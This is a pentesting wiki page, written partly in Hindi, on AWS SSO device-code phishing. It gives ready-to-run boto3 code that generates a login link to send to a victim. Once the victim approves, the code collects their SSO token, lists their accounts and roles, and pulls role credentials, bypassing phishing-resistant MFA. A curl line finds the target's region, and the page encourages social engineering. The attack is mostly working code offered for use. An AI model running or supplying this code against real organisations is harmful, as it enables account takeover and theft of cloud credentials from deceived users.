# AWS - Identity Center & SSO Unauthenticated Enum

{{#include ../../../../banners/hacktricks-training.md}}

## AWS Device Code Phishing

Initially proposed in [**this blog post**](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/), it's possible to send a **link** to a user using AWS SSO that if the **user accepts** the attacker will be able to get a **token to impersonate the user** and access all the roles the user is able to access in the **Identity Center**.

इस हमले को करने के लिए आवश्यक शर्तें हैं:

- पीड़ित को **Identity Center** का उपयोग करना होगा
- attacker को पीड़ित द्वारा उपयोग किया गया **subdomain** पता होना चाहिए `<victimsub>.awsapps.com/start`

सिर्फ़ इन जानकारियों से, **attacker user को एक link भेज सकेगा** जिसे अगर **स्वीकार कर लिया गया** तो **attacker को AWS user** अकाउंट पर पहुँच मिल जाएगी।

### Attack

1. **Finding the subdomain**

पहला कदम attacker के लिए यह पता लगाना है कि victim कंपनी अपने Identity Center में कौन सा subdomain उपयोग कर रही है। यह **OSINT** या **guessing + BF** के जरिए किया जा सकता है क्योंकि अधिकांश कंपनियाँ यहाँ अपना नाम या उसके किसी रूप का उपयोग करती हैं।

इन जानकारियों के साथ, उस region को पता करना संभव होता है जहाँ Identity Center कॉन्फ़िगर किया गया था:
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **लक्षित के लिए लिंक जनरेट करें & भेजें**

निम्नलिखित कोड चलाकर AWS SSO login link जनरेट करें ताकि पीड़ित authenticate कर सके.\  
डेमो के लिए, यह कोड python console में चलाएँ और इसे बंद न करें क्योंकि बाद में आपको token प्राप्त करने के लिए कुछ objects की आवश्यकता होगी:
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
जनरेट किया गया लिंक victim को अपने शानदार social engineering कौशल का उपयोग करके भेजें!

3. **जब तक victim इसे स्वीकार न कर ले, प्रतीक्षा करें**

यदि victim पहले से **AWS में logged in** था, तो उसे केवल permissions देने को स्वीकार करना होगा; यदि वह logged in नहीं था, तो उसे पहले **login** करना होगा और फिर permissions देने को स्वीकार करना होगा.\
यहाँ आजकल का prompt इस तरह दिखता है:

<figure><img src="../../../images/image (343).png" alt="" width="311"><figcaption></figcaption></figure>

4. **SSO access token प्राप्त करें**

यदि victim ने prompt स्वीकार कर लिया है, तो इस कोड को चलाएँ ताकि **user की नकल करके एक SSO token generate किया जा सके**:
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
SSO access token **8h के लिए मान्य है**।

5. **उपयोगकर्ता की नकल करें**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### Phishing the unphisable MFA

यह जानकर मज़ा आता है कि पिछला हमला **काम करता है भले ही "unphisable MFA" (webAuth) उपयोग किया गया हो**। इसका कारण यह है कि पिछला **workflow कभी भी उपयोग किए गए OAuth domain से बाहर नहीं जाता**। अन्य phishing हमलों की तरह जहाँ उपयोगकर्ता को login domain को बदलना पड़ता है, इस मामले में device code workflow इस तरह तैयार किया जाता है कि एक **code किसी device द्वारा जाना जाता है** और उपयोगकर्ता किसी अलग मशीन पर भी login कर सकता है। यदि prompt स्वीकार कर लिया गया, तो device, केवल **initial code को जानकर**, उपयोगकर्ता के लिए **credentials प्राप्त** करने में सक्षम होगा।

For more info about this [**check this post**](https://mjg59.dreamwidth.org/62175.html).

### स्वचालित टूल

- [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
- [https://github.com/sebastian-mora/awsssome_phish](https://github.com/sebastian-mora/awsssome_phish)

## संदर्भ

- [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
- [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
- [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
- [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

{{#include ../../../../banners/hacktricks-training.md}}
